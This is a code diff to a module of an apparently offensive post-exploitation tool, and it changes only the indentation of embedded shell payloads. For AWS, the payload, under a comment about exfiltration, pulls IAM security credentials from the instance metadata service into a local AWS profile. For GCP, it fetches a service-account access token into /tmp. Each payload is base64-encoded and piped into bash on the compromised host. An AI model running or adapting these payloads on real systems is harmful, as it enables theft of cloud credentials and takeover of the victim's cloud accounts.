@@ -48,24 +48,24 @@ class Module(BaseModule):
                 # create an instance profile to exfiltrate
                 if csp == "aws":
                     payload = base64.b64encode('''opts="--no-cli-pager"
-                                                INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
-                                                AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-                                                AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-                                                AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-                                                AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
-                                                cat > .aws-ec2-instance <<-EOF
-                                                AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
-                                                AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
-                                                AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
-                                                AWS_DEFAULT_REGION=us-east-1
-                                                AWS_DEFAULT_OUTPUT=json
-                                                EOF
-                                                PROFILE="instance"
-                                                aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
-                                                aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
-                                                aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
-                                                aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
-                                                aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
+INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
+AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
+cat > .aws-ec2-instance <<EOF
+AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
+AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
+AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
+AWS_DEFAULT_REGION=us-east-1
+AWS_DEFAULT_OUTPUT=json
+EOF
+PROFILE="instance"
+aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
+aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
+aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
+aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
+aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     log("creating an instance creds profile...")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'",
@@ -105,8 +105,8 @@ class Module(BaseModule):
                     # example usage: curl https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances -H "Authorization":"Bearer ACCESS_TOKEN"
                     payload = base64.b64encode(
                         b'''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
-                        echo $ACCESS_TOKEN > /tmp/instance_access_token.json
-                        ''')
+echo $ACCESS_TOKEN > /tmp/instance_access_token.json
+''')
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instancetoken | base64 -d | /bin/bash'",
                         cwd="/tmp", timeout=900)
